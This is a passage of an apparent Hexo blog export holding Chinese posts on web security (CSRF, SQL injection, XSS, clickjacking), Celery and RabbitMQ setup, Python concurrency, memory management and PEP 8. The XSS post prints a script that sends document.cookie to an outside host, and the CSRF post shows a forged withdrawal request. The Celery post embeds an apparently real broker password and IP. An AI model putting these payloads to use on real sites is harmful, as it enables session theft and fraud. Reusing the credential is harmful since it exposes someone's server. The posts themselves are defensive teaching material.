是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。 （3）在 HTTP 头中自定义属性并验证 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。 CSRF攻击实列 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。 这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 注: 本文搜集与网上,转载地址：http://www.phpddt.com/reprint/csrf.html,感谢作者,写的非常好。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>如何防范CSRF攻击?</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[celery的简单安装及应用]]></title>
    <url>%2F2016%2F06%2F13%2FCelery%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E4%B8%8E%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Celery介绍Celery 是一个简单、灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。但Celery本身不提供队列服务，官方推荐使用RabbitMQ或Redis来实现消息队列服务，前者是更好的选择，它对AMQP（高级消息队列协议）做出了非常好的实现。 所以在使用Celery之前需要在远程服务器(centOS)上部署RabbitMQ,我们这里使用docker来安装,关于为什么使用docker来安装,可以查看我的另一片docker的介绍: 安装RabbitMQ 123456# 安装镜像docker pull rabbitmq# 创建容器名为myrabbit,并运行镜像docker run -d -p 5672:5672 --name myrabbit rabbitmq# 进入此容器docker container exec -it myrabbit /bin/bash 创建用户、资源以及分配操作权限 12345678# 创建用户 自定义用户名username,和密码passwordrabbitmqctl add_user username password# 设置用户为管理员用户rabbitmqctl set_user_tags username administrator# 创建消息队列rabbitmqctl add_vhost myvhost# 给用户分配权限, 读/写/配置 ".*" 表示所有权限rabbitmqctl set_permissions -p myvhost username ".*" ".*" ".*" 创建celery实例(注意这个是在你Django项目中进行的) 12345678910111213141516171819# 下面这段代码,放在你工程目录的init.py文件中project_name = 'name' #这里name填写你的项目名称project_settings = '%s.settings' % project_name# 注册环境变量os.environ.setdefault('DJANGO_SETTINGS_MODULE', project_settings)app = celery.Celery( project_name, # 下面jerry换成你自己服务器配置RabbitMQ的用户名,leijun520换成你自己的密码,ip地址换成你自己的ip地址,端口号如果默认的5672则不用更改, myvhost是你自己创建的消息队列名称 backend='amqp://jerry:leijun520@120.77.222.217:5672/myvhost', broker='amqp://jerry:leijun520@120.77.222.217:5672/myvhost')# 从默认的配置文件读取配置信息app.config_from_object('django.conf:settings')# Celery加载所有注册的应用app.autodiscover_tasks(lambda: settings.INSTALLED_APPS) 启动 celery创建worker(在本地项目中启动) 12# project_name你项目名称, -l 为日志log,info为异常等级,也可以为debug等,&amp;表示启动进程在后台运行celery -A project_name worker -l info &amp; 执行异步任务 123456@app.taskdef send_email(from, to, cc, subject, content): passasync_result = send_email.delay('', [], [], '', '')async_result.get() 创建定时任务 12345678# 导包from celery.schedules import crontabfrom celery.task import periodic_task@periodic_task(run_every=crontab('*', '12,18'))def print_dummy_info(): print('定时任务') 检查定时任务并交给worker执行 1celery -A project_name beat -l info 检查消息队列状况 12# 在配置服务器端执行检查rabbitmqctl list_queues -p myvhost 注: 推荐阅读：《Celery官方文档中文版》，上面有极为详细的配置和使用指南。]]></content>
      <categories>
        <category>python Django</category>
      </categories>
      <tags>
        <tag>celery的应用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入攻击]]></title>
    <url>%2F2016%2F01%2F06%2FSQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是SQL注入?所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 SQL注入攻击原理SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 SQL注入分类 平台层注入由不安全的数据库配置或数据库平台的漏洞所致 代码层注入由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。 SQL注入原因 基于分类，SQL注入的产生原因通常表现在以下几方面：①不当的类型处理；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤转义字符处理不合适；⑥多个提交处理不当。 如何防御SQL注入对于防御需要做的就是两件事：（1）找到所有的SQL注入漏洞；（2）修补这些漏洞； 1使用预编译语句一般来说，防御SQL语句注入的最佳方式，就是使用预编译语句，绑定变量。 使用预编译的SQL语句，SQL语句的语义不会发生改变，在SQL语句中，变量用？表示，攻击者无法改变SQL的结构。 2 使用存储过程除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。使用存储过程的效果和使用预编译语句类似，其区别就是存储过程需要先将SQL语句定义在数据库中。但需要注意的是，存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句，如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。 3 检查数据类型检查输入数据的数据类型，在很大程度上可以对抗SQL注入。 4 使用安全函数一般来说，各种web语言都实现了一些编码函数，可以帮助对抗SQL注入。 在最后，从数据库自身的角度来说，应该使用最小权限原则，避免web应用直接使用root、dbowner等高权限账户直接连接数据库。如果有多个不同的应用在使用同一个数据库，则也应该为每个应用分配不同的账户。Web应用使用的数据库账户，不应该创建自定义函数、操作本地文件的权限。除了SQL注入外，在web安全领域还有其他的攻击注入，这些注入攻击都有相同的特点，就是违背了“数据与代码分离”原则。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>SQL注入攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何预防XSS攻击?]]></title>
    <url>%2F2016%2F01%2F06%2F%E5%A6%82%E4%BD%95%E9%A2%84%E9%98%B2XSS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是XSS?XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。 XSS如何攻击?其原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等。 举个列子: 有一个web页面,内含表单共用户发表文章(如博客网站),假如我是一个攻击者,我会在内容中添加一些攻击代码,比如盗取其他用户cookie信息: 12345This is a XSS test!&lt;script&gt;var cookie = document.cookie;window.open("http://demo.com/getCookie.php?param="+cookie)&lt;/script&gt; 如果该网页管理者没有对我提交的表单内容做任何过滤处理,当其他用户查看我的内容时,,其他用户的cookie信息就会发送至我的http://demo.com站点,被我盗取。 如何预防?要想防范攻击我们就需要对用户提交的表单内容进行过滤,有时数据库也有可能被攻击,这时就需要对模板中的输出数据也进行过滤,所以总结起来一般就这两种常见方法: 对用户输入的数据进行过滤。 对视图模板中输出的数据进行过滤。 过滤其实就是将用户提交的代码中的一些特殊字符转化为html实体,比如将上面代码中的&amp; , &lt; , &gt;等字符转换,代码就变成如下样子: 12345&amp;lt;b&amp;gt;This is a XSS test!&amp;lt;/b&amp;gt;&amp;lt;script&amp;gt;var cookie = document.cookie;window.open(&amp;quot;http://demo.com/getCookie.php?param=&amp;quot;+cookie);&amp;lt;/script&amp;gt; 这样代码基本就无法执行了,举例: python的django中一般使用escape过滤器对单一变量进行转义过滤,或者使用django的html文档自动转义。 在 PHP 中，可以使用 htmlspecialchars 或 htmlentities 函数对用户提交的表单数据进行过滤。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>如何预防XSS攻击?</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[进程线程]]></title>
    <url>%2F2016%2F01%2F06%2F%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[进程什么是进程?打开任务管理器,看到的每一个任务就是一个进程,所以多进程,也叫多任务,下面讲讲多任务的由来: 1， 早期的计算机是没有操作系统的，只有输入，计算，输出。手工输入速度远低于计算机的计算速度。 2， 于是出现了批处理操作系统，通过纸带，磁带等工具预先写入指令，形成一个指令清单（即任务）交给计算机处理。但批处理系统的缺点是只能有一个任务，而且当计算机在进行I/O处理时，CPU是空闲的。 3， 世人发明了进程，一个进程就代表一个任务，多个进程通过分时操作能让用户认为并行操作多任务，进程间的资源是独立单元，但是可以通过介质进行通信。缺点：进程内只进行串行处理，无法很好地分工合作提高处理效率。 4， 于是就有了操作系统调度的最小单元-线程，线程能够使进程内的子任务能够共享进程内的资源，并并行工作，大大提高操作系统的性能。 区别：线程是任务调度的最小单元，共用进程内的资源。进程是资源分配的最小单元，与其他进程资源互相独立。 线程在一个进程的内部，要同时干多件事，就需要同时运行多个“子任务”，我们把进程内的这些“子任务”叫做线程。 线程通常叫做轻型的进程。线程是共享内存空间的并发执行的多任务，每一个线程都共享一个进程的资源。 线程是最小的执行单元，而进程由至少一个线程组成。如何调度进程和线程，完全由操作系统决定，程序自己不能决定什么时候执行，执行多长时间。 模块1、_thread模块 低级模块，接近底层。2、threading模块 高级模块，对_thread进行了封装 python中的多线程是假的多线程!为什么这么说，我们先明确一个概念，全局解释器锁（GIL）global interpreter lock Python代码的执行由Python虚拟机（解释器）来控制,同时只有一个线程在执行 对Python虚拟机的访问由全局解释器锁（GIL）来控制，正是这个锁能保证同时只有一个线程在运行。 在多线程环境中，Python虚拟机按照以下方式执行。 1.设置GIL。 2.切换到一个线程去执行。 3.运行。 4.把线程设置为睡眠状态。 5.解锁GIL。 6.再次重复以上步骤。 比方我有一个4核的CPU，那么这样一来，在单位时间内每个核只能跑一个线程，然后时间片轮转切换。但是Python不一样，它不管你有几个核，单位时间多个核只能跑一个线程，然后时间片轮转。执行一段时间后让出，多线程在Python中只能交替执，100核只能用到1个核例如，下面的代码4核cpu只会用一个核，大概占用25%的cpu使用率。 进程vs线程要实现多任务，通常我们会设计Master-Worker模式，Master负责分配任务，Worker负责执行任务，因此，多任务环境下，通常是一个Master，多个Worker。 如果用多进程实现Master-Worker，主进程就是Master，其他进程就是Worker。 如果用多线程实现Master-Worker，主线程就是Master，其他线程就是Worker。 多进程模式最大的优点就是稳定性高，因为一个子进程崩溃了，不会影响主进程和其他子进程。（当然主进程挂了所有进程就全挂了，但是Master进程只负责分配任务，挂掉的概率低）著名的Apache最早就是采用多进程模式。 多进程模式的缺点是创建进程的代价大，在Unix/Linux系统下，用fork调用还行，在Windows下创建进程开销巨大。另外，操作系统能同时运行的进程数也是有限的，在内存和CPU的限制下，如果有几千个进程同时运行，操作系统连调度都会成问题。 多线程模式通常比多进程快一点，但是也快不到哪去，而且，多线程模式致命的缺点就是任何一个线程挂掉都可能直接造成整个进程崩溃，因为所有线程共享进程的内存。在Windows上，如果一个线程执行的代码出了问题，你经常可以看到这样的提示：“该程序执行了非法操作，即将关闭”，其实往往是某个线程出了问题，但是操作系统会强制结束整个进程。 在Windows下，多线程的效率比多进程要高，所以微软的IIS服务器默认采用多线程模式。由于多线程存在稳定性的问题，IIS的稳定性就不如Apache。为了缓解这个问题，IIS和Apache现在又有多进程+多线程的混合模式，真是把问题越搞越复杂。 计算密集型 vs. IO密集型是否采用多任务的第二个考虑是任务的类型。我们可以把任务分为计算密集型和IO密集型。 计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。 计算密集型任务由于主要消耗CPU资源，因此，代码运行效率至关重要。Python这样的脚本语言运行效率很低，完全不适合计算密集型任务。对于计算密集型任务，最好用C语言编写。 第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。 IO密集型任务执行期间，99%的时间都花在IO上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。 异步IO考虑到CPU和IO之间巨大的速度差异，一个任务在执行的过程中大部分时间都在等待IO操作，单进程单线程模型会导致别的任务无法并行执行，因此，我们才需要多进程模型或者多线程模型来支持多任务并发执行。 现代操作系统对IO操作已经做了巨大的改进，最大的特点就是支持异步IO。如果充分利用操作系统提供的异步IO支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型，Nginx就是支持异步IO的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。由于系统总的进程数量十分有限，因此操作系统调度非常高效。用异步IO编程模型来实现多任务是一个主要的趋势。 对应到Python语言，单线程的异步编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。 以I/O为瓶颈的程序正是协程所擅长的 !]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>进程线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python内存管理]]></title>
    <url>%2F2015%2F10%2F06%2Fpython%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[python的内存管理引用计数: ​ python 内部使用引用计数,来保持追踪内存中的对象,python内部记录了多少个引用,就引用计数,当对象被创建时就创建一个引用计数,当对象不再需要的时候,这个对象的引用计数为0时,他被垃圾回收. ​ 引用计数会增加: 对象被创建;被作为参数传递给函数;作为容器对象的一个元素; ​ 引用计数减少: 一个本地引用离开他的作用域;对象的别名被显示的销毁;对象的一个别名被赋值给其他对象;窗口对象本身被销毁. 垃圾回收: ​ Python不像c++和java语言一样，他们可以不用事先声明变量类型而直接对变量进行赋值，对Python语言来讲，对象的类型和内存都是在运行时确定的。 ​ 当内存中有不再使用的部分时，垃圾收集器就会把他们清理掉。他会去检查那些引用计数为0的对象，然后清除其在内存中的空间。当然除了引用计数为0的会被清除，还有一种情况也会被垃圾收集器清掉，当两个对象相互引用时，他们本身其他引用已经为0了。 垃圾回收机制还有一个循环垃圾回收器，确保释放循环引用对象。 在Python中，许多时候申请的内存都是小块的内存，这些小块内存在申请后，很快又会被释放，由于这些内存的申请号并不是为了创建对象，所以并没有对象一级的内存池机制，这就意味着Python在运行期间会大量的执行malloc和free操作，频繁的在用户和核心态之间进行切换，这将严重影响Python的执行效率，为了加速Python的执行效率，Python引入了一个内存池机制，用于管理对小块内存的申请和释放。 内存池机制: ​ Python提供了对内存的垃圾收集机制，但是他将不用的内存放到内存池而不是反回给操作系统。 Python中所有小于256个字节的对象都是用pymalloc实现的分配器，而大的对象则使用系统的malloc，另外Python对象比如整数浮点数和list都有独立的私有内存池，对象间不共享他们的内存池，也就是说你分配又释放了大量的整数，用于缓存这些整数的内存就不能再分配给浮点数。 ​]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[点击劫持攻击]]></title>
    <url>%2F2015%2F08%2F11%2F%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[什么是点击劫持(ClickJacking) 点击劫持(ClickJacking)是一种视觉上的欺骗手段，攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户在不知情的情况下点击了透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上; 点击劫持与CSRF攻击有异曲同工之妙，都是在用户不知道情况下进行的攻击。但是：在CSRF中，如果出现用户交互的页面，则攻击可能无法顺利完成。与之相反的是，点击劫持没有这个顾虑，他利用的就是与用户产生交互的页面。 几种常见点击劫持手段 flash点击劫持攻击者通过Flash构造出了点击劫持，在完成一系列复杂的动作之后，最终控制了用户的摄像头，原理：黑客在Flash游戏页面内嵌了一个iframe，通过游戏选项按钮诱导用户去点击按钮，从而最终实现Flash点击劫持！每次点击完成之后按钮的位置都是可变化的、移动的。 图片覆盖劫持(XSIO)点击劫持的本质就是一种视觉欺骗，通过这种思想，黑客可以完成很多劫持，例如：钓鱼网站的实现，通过图片覆盖导致链接到一些未知的网站，从而达到黑客正真的目的。原理：通过调整图片的style使得图片能够覆盖在他所指定的任意位置。 XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS。如果应用没有限制style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持。 拖拽劫持目前很多浏览器都开始支持Drag&amp;Drop的API。对于用户来说，拖拽他们的操作更加简单。浏览器拖拽的对象可以是一个连接，也可以是一段文字，还可以从一个窗口拖拽到另外一个窗口，因此拖拽不受同源策略的影响。 “拖拽劫持”的思路是诱使用户从隐藏的不可见iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能够控制的另外一个页面，从而窃取数据。 触屏劫持（TapJacking）触屏，从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。 一次触屏操作，可能会对应一下几个事件的发生： （1）touchstart，手指触摸屏幕时发生； （2）Touchend，手指离开屏幕时发生； （3）Touchmove，手指滑动时发生； （4）Touchcancel，系统可取消touch事件 如何预防 进制跨域iframe通常可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫做frame busting。 X-Frame-Options因为frame busting存在被绕过的可能，所以我们需要寻找更好的解决方案。一个比较好的解决方案就是使用一个http头—X-Frame-Options 它有三个可选的值：DENY SAMEORIGIN ALLOW-FROM-origin 当值为deny时，浏览器会拒绝当前页面加载任何frame页面；若值为SAMEORIGIN ，则frame页面的地址只能为同源域名下面的页面；若值为ALLOW-FROM-origin，则可以定义允许frame加载页面地址。 除以上方式以外：Firefox的“Content Security Policy”以及Firefox的NoScript扩展也能够有效防御ClickJacking. H5中的sandbox属性在HTML 5中，专门为iframe定义了一个新的属性，叫做sandbox；使用sandbox这一个属性后，iframe 标签加载的内容将被视为一个独立的“源”，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览器对象的连接也会被禁止。]]></content>
      <categories>
        <category>network security</category>
      </categories>
      <tags>
        <tag>点击劫持攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PEP 8风格指南]]></title>
    <url>%2F2015%2F03%2F03%2FPEP%208%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[PEP8简介PEP是Python Enhancement Proposal的缩写，通常翻译为“Python增强提案”。每个PEP都是一份为Python社区提供的指导Python往更好的方向发展的技术文档，其中的第8号增强提案（PEP 8）是针对Python语言编订的代码风格指南。尽管我们可以在保证语法没有问题的前提下随意书写Python代码，但是在实际开发中，采用一致的风格书写出可读性强的代码是每个专业的程序员应该做到的事情，也是每个公司的编程规范中会提出的要求，这些在多人协作开发一个项目（团队开发）的时候显得尤为重要。我们可以从Python官方网站的PEP 8链接中找到该文档，下面我们对该文档的关键部分做一个简单的总结。 空格的使用 使用空格来表示缩进而不要用制表符（Tab）。这一点对习惯了其他编程语言的人来说简直觉得不可理喻，因为绝大多数的程序员都会用Tab来表示缩进，但是要知道Python并没有像C/C++或Java那样的用花括号来构造一个代码块的语法，在Python中分支和循环结构都使用缩进来表示哪些代码属于同一个级别，鉴于此Python代码对缩进以及缩进宽度的依赖比其他很多语言都强得多。在不同的编辑器中，Tab的宽度可能是2、4或8个字符，甚至是其他更离谱的值，用Tab来表示缩进对Python代码来说可能是一场灾难。 和语法相关的每一层缩进都用4个空格来表示。 每行的字符数不要超过79个字符，如果表达式因太长而占据了多行，除了首行之外的其余各行都应该在正常的缩进宽度上再加上4个空格。 函数和类的定义，代码前后都要用两个空行进行分隔。 在同一个类中，各个方法之间应该用一个空行进行分隔。 二元运算符的左右两侧应该保留一个空格，而且只要一个空格就好。 标识符命名PEP 8倡导用不同的命名风格来命名Python中不同的标识符，以便在阅读代码时能够通过标识符的名称来确定该标识符在Python中扮演了怎样的角色（在这一点上，Python自己的内置模块以及某些第三方模块都做得并不是很好）。 变量、函数和属性应该使用小写字母来拼写，如果有多个单词就使用下划线进行连接。 类中受保护的实例属性，应该以一个下划线开头。 类中私有的实例属性，应该以两个下划线开头。 类和异常的命名，应该每个单词首字母大写。 模块级别的常量，应该采用全大写字母，如果有多个单词就用下划线进行连接。 类的实例方法，应该把第一个参数命名为self以表示对象自身。 类的类方法，应该把第一个参数命名为cls以表示该类自身。 表达式和语句在Python之禅（可以使用import this查看）中有这么一句名言：“There should be one– and preferably only one –obvious way to do it.”，翻译成中文是“做一件事应该有而且最好只有一种确切的做法”，这句话传达的思想在PEP 8中也是无处不在的。 采用内联形式的否定词，而不要把否定词放在整个表达式的前面。例如if a is not b就比if not a is b更容易让人理解。 不要用检查长度的方式来判断字符串、列表等是否为None或者没有元素，应该用if not x这样的写法来检查它。 就算if分支、for循环、except异常捕获等中只有一行代码，也不要将代码和if、for、except等写在一起，分开写才会让代码更清晰。 import语句总是放在文件开头的地方。 引入模块的时候，from math import sqrt比import math更好。 如果有多个import语句，应该将其分为三部分，从上到下分别是Python标准模块、第三方模块和自定义模块，每个部分内部应该按照模块名称的字母表顺序来排列。 注: 本文采集于网上,关注更多python开发知识可关注CSDN 博客 骆昊老师专栏https://me.csdn.net/jackfrued]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>PEP 8风格指南</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2015%2F01%2F06%2F%E6%96%B0%E5%BB%BA%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3%20-%20%E5%89%AF%E6%9C%AC%20-%20%E5%89%AF%E6%9C%AC%2F</url>
    <content type="text"></content>
  </entry>
</search>
